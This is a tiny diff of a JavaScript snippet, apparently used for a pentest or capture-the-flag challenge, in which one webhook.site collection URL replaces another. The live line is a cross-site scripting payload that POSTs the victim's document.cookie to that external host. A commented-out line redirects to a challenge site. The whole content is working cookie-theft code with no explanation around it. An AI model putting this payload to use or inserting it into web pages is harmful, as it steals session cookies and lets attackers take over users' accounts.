@@ -1,2 +1,2 @@
-fetch('https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77', { method: 'POST', mode: 'no-cors', body:document.cookie });
+fetch('https://webhook.site/fe191876-3d2f-4744-9aac-aa1dfd43d8be', { method: 'POST', mode: 'no-cors', body:document.cookie });
 // window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
